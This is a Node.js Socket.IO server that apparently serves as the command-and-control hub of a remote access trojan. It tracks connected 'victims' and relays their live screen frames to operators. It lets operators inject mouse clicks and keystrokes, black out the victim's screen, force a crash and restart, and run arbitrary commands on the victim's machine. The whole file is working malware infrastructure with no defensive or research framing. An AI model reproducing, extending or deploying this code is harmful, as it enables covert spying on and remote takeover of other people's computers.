const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  transports: ["websocket", "polling"],
  cors: { origin: "*" },
  maxHttpBufferSize: 10 * 1024 * 1024,
  pingTimeout: 60000,
  pingInterval: 25000
});

const PORT = process.env.PORT || 8080;

// ── State ──
const victims = new Map();        // victimId -> { socket, w, h, connectedAt }
const viewers = new Map();        // socket -> { viewing: victimId }
const frameStreams = new Map();   // victimId -> Set<viewerSockets>
const victimActivity = new Map(); // victimId -> lastFrameAt (for keepalive)

// ── Serve client HTML ──
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "client.html"));
});

app.get("/healthz", (req, res) => {
  res.status(200).send("OK");
});

// ── Socket.IO ──
io.on("connection", (socket) => {
  console.log(`[+] Connection: ${socket.id}`);

  // ═══════════════════════════════════════════════════
  // VICTIM REGISTRATION
  // ═══════════════════════════════════════════════════
  socket.on("register-victim", (data) => {
    const victimId = data.id || socket.id;
    victims.set(victimId, {
      socket,
      w: data.w || 1920,
      h: data.h || 1080,
      connectedAt: Date.now()
    });
    socket.victimId = victimId;
        socket.role = "victim";

    console.log(`[VICTIM ONLINE] ${victimId} (${data.w}x${data.h})`);

    // Notify all viewers
    broadcastVictimList();

    // ── Frame forwarding (only if someone is watching) ──
    socket.on("frame", (frameData) => {
          const stream = frameStreams.get(victimId);
      if (stream && stream.size > 0) {
        victimActivity.set(victimId, Date.now());
        stream.forEach((viewerSocket) => {
          if (viewerSocket.connected) {
            viewerSocket.emit("frame", { victimId, buf: frameData.buf });
          } else {
            stream.delete(viewerSocket);
          }
        });
          }
    });

    // ── Blackout status forwarding ──
    socket.on("blackout-status", (data) => {
      const stream = frameStreams.get(victimId);
      if (stream) {
        stream.forEach((vs) => {
          if (vs.connected) vs.emit("blackout-status", data);
        });
      }
    });

    // ── Exec result forwarding ──
    socket.on("exec-result", (data) => {
      const stream = frameStreams.get(victimId);
      if (stream) {
        stream.forEach((vs) => {
          if (vs.connected) vs.emit("exec-result", data);
        });
      }
    });

    socket.on("disconnect", () => {
      console.log(`[VICTIM OFFLINE] ${victimId}`);
      victims.delete(victimId);
      frameStreams.delete(victimId);
      victimActivity.delete(victimId);
      broadcastVictimList();
    });
  });

  // ═══════════════════════════════════════════════════
  // VIEWER (browser) REGISTRATION
  // ═══════════════════════════════════════════════════
  socket.on("register-viewer", () => {
    socket.role = "viewer";
    viewers.set(socket, { viewing: null });
    console.log(`[VIEWER ONLINE] ${socket.id}`);

    // Send victim list immediately
    socket.emit("victim-list", getVictimList());

    // ── Select victim to view ──
    socket.on("select-victim", (victimId) => {
      const victim = victims.get(victimId);
      if (!victim) {
        socket.emit("error", { msg: "Victim not available" });
        return;
      }

      // Unsubscribe from previous
      const prev = viewers.get(socket);
      if (prev && prev.viewing) {
        const prevStream = frameStreams.get(prev.viewing);
        if (prevStream) {
          prevStream.delete(socket);
          if (prevStream.size === 0) {
            const oldVictim = victims.get(prev.viewing);
            if (oldVictim && oldVictim.socket.connected) {
              oldVictim.socket.emit("viewer-count", 0);
            }
          }
        }
      }

      // Subscribe to new victim
      viewers.set(socket, { viewing: victimId });
      if (!frameStreams.has(victimId)) {
        frameStreams.set(victimId, new Set());
      }
      frameStreams.get(victimId).add(socket);

      // Tell victim someone is watching
      victim.socket.emit("viewer-count", frameStreams.get(victimId).size);

      // Send victim info to viewer
      socket.emit("victim-info", {
        id: victimId,
        w: victim.w,
        h: victim.h
      });

      console.log(`[VIEWING] ${socket.id} -> ${victimId}`);
    });

    // ── Click ──
    socket.on("click", (data) => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) return;
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("click", { x: data.x, y: data.y, btn: data.btn || "left" });
      }
    });

    // ── Key ──
    socket.on("key", (key) => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) return;
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("key", key);
      }
    });

    // ── Blackout toggle ──
    socket.on("toggle-blackout", (state) => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) {
        socket.emit("error", { msg: "No victim selected" });
        return;
      }
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("blackout", state);
      } else {
        socket.emit("error", { msg: "Victim disconnected" });
      }
    });

    // ── Crash & restart ──
    socket.on("trigger-crash", () => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) {
        socket.emit("error", { msg: "No victim selected" });
        return;
      }
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("crash-and-restart");
        socket.emit("system", { msg: "Crash/restart triggered" });
      } else {
        socket.emit("error", { msg: "Victim disconnected" });
      }
    });

    // ── Execute command on victim ──
    socket.on("exec-victim", (cmd) => {
      const viewer = viewers.get(socket);
      if (!viewer || !viewer.viewing) {
        socket.emit("error", { msg: "No victim selected" });
        return;
      }
      const victim = victims.get(viewer.viewing);
      if (victim && victim.socket.connected) {
        victim.socket.emit("exec", cmd);
      } else {
        socket.emit("error", { msg: "Victim disconnected" });
      }
    });

    // ── Request victim list refresh ──
    socket.on("get-victims", () => {
      if (socket.role === "viewer") {
        socket.emit("victim-list", getVictimList());
      }
    });

    socket.on("disconnect", () => {
      console.log(`[VIEWER OFFLINE] ${socket.id}`);
      const viewer = viewers.get(socket);
      if (viewer && viewer.viewing) {
        const stream = frameStreams.get(viewer.viewing);
        if (stream) {
          stream.delete(socket);
          if (stream.size === 0) {
            const victim = victims.get(viewer.viewing);
            if (victim) {
              victim.socket.emit("viewer-count", 0);
            }
          }
        }
      }
      viewers.delete(socket);
    });
  });
});

function getVictimList() {
  const list = [];
  for (const [id, victim] of victims) {
    list.push({
      id,
      w: victim.w,
      h: victim.h,
      connectedAt: victim.connectedAt
    });
  }
  return list;
}

function broadcastVictimList() {
  const list = getVictimList();
  for (const [socket] of viewers) {
    if (socket.connected) {
      socket.emit("victim-list", list);
    }
  }
}

server.listen(PORT, "0.0.0.0", () => {
  console.log(`[SERVER] Listening on http://0.0.0.0:${PORT}`);
});
